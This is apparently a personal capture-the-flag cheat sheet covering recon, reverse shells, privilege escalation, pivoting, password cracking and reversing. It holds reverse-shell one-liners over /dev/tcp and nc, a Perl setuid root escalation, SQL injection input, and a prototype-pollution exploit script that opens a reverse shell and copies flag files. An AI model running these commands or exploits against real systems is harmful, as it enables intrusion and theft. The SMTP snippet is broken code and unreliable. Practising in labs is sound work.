# CTF Reference

## Web recon
 
 ### nmap 👁️
```shell
nmap -sC -A -T4 <ip>
```

### ffuf 🌩️
```shell
ffuf -u http://<url>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```shell
ffuf -u http://<url> -w /usr/share/dnsrecon/subdomains-top1mil.txt -H "Host: FUZZ.<domain>.com" -fc 301
```

### gobuster
```shell
gobuster dir -u http://<url> -w /usr/share/wordlists/dirb/common.txt
```

### Nikto
```shell
nikto -host <ip>
```

### dirb
```shell
dirb <url> /usr/share/wordlists/dirb/common.txt
```

### Git Dumper
```
pip install git-dumper
git-dumper https://some-url/.git ./meow
ls ./meow
```

### get headers with wget
```
wget -S some://url
```

### Basic banner grabbing (Python)
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.198.73.23", 23))
print s.recv(1024)
```

### ICMP scan
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

## Initial access

- [:alien: Revshells](https://www.revshells.com/)

### nc reverse shell

Listener
```
nc -nlvp 444
```

Client
```
/bin/sh | nc <ip> 444
# or
bash -c "bash -i >& /dev/tcp/127.0.0.1/444 0>&1"
```

### Escalation payloads
[gtfobins](https://gtfobins.github.io/gtfobins/ssh/)

### Basic Python shell
```
import os
os.system("/bin/bash")
```

### Basic SQL injections
```
' OR name='test';--
```

## Linux privilege escalation / enumeration
- [Lin Enum](https://github.com/rebootuser/LinEnum)
- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [RustScan](https://github.com/RustScan/RustScan)
 
### Basic sudo escalation
```
sudo -l
sudo -u theuser <app>
sudo --preserve-env=PATH /some/thing
```

### Perl escalation
```
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## Pivoting
- [FoxyProxy extension](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/)
- [Proxychains](https://github.com/haad/proxychains)

### Enum
```
arp -a                 # arp cache
cat /etc/hosts         # look at hosts file
cat /etc/resolv.conf   # linux local dns
nmcli dev show         # 
ipconfig /all          # local dns on windows
```

## Cryptography

- [Crypto Chef](https://gchq.github.io/CyberChef/)

### John

```
/usr/share/john/ssh2john.py id_rsa > id_rsa_hash

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
```

## Reverse

Use ghidra to reverse the code to C

```
file some-executable
checksec --file=some-executable
strace ./some-executable
rtrace ./some-executable
```

### GDB
- [gdb-peda](https://github.com/longld/peda)

```
gdb some-executable
(gdb) info break
(gdb) info registers
(gdb) disassemble <fn-name>
(gdb) break *0x000055555555539c
(gdb) run
(gdb) stepi
(gdb) continue

# stripped workflow
(gdb) run
(gdb) info file                 # look for entry point
(gdb) break *0x555555555080
(gdb) run
(gdb) x/1000i $rip              # list 1k lines from instruction pointer
(gdb) x/1000i 0x5555555558dd    # list 1k lines from address
```

### C Stuff
```
// time_t time(time_t *second) returns epoch in seconds
time_t tVar;
tVar = time((time_t *)0x0); // argument is NULL

void srand(unsigned int seed) // sets a seed for rand() to use
int rand(void)
```

### Assembly stuff
#### Registers
```
RBP: bottom of the current stack frame
RAX: 64bit version of EAX(32bit), and AX(16bit)
``` 

#### functions

```
LEA accepts a standard memory addressing operand, but does nothing more than store the calculated memory offset in the specified register, which may be any general purpose register.
```
```
MOV dest_reg source_reg
MOV eax, 0x0
```

## Steganography
- [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [Stego](https://0xrick.github.io/lists/stego/)

## Other usefull stuff

### Adding to PATH
```
PATH=$PATH:/some/path
```

### ssh with private key
```
ssh -i some_id_rsa <usr>@<ip>
```

### Metasploit basic usage
```shell
msfconsole
search <name>
use <id>
show options
set rhosts <ip>
set targeturi /cgi-bin/hello.cgi
run
```

### Quick Python HTTP server

Will serve any file in directory
```shell
python -m SimpleHTTPServer 8000 # if python2
python -m http.server
```

To fetch from the remote machine
```shell
wget http://<ip>:8000/LinEnum.sh
```

### Recursive wget 
```shell
wget -r --level=1 -p http://<website> 
find . -name "*" -exec cat {} \; | grep "@email.com" # find strings in downloaded sites
```

### Protoype pollution AST injection
- [Nodejs AST injection](https://blog.p6.is/AST-Injection/)

```python
import requests

TARGET_URL = 'http://10.10.12.14:8713'

r1 = requests.post(TARGET_URL + '/submit', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/10.10.12.14/6666 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

print(r1._content)


r2 = requests.post(TARGET_URL + '/submit', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`cat flag* >> ./static/file.txt`)"
    }
})

print(r2._content)
```

### Basic SMTP enum (Python)

```python
import socket
f = open("userlist", "r")
users = f.readlines()

for user in users:
    s = socket.socket(socket.AFINTE)

    s.connect(("mail.baldrinc.com", 25))
    s.recv(1024)
    s.send("HELO")
    #...
    
# 546d467562334a356558493d
```
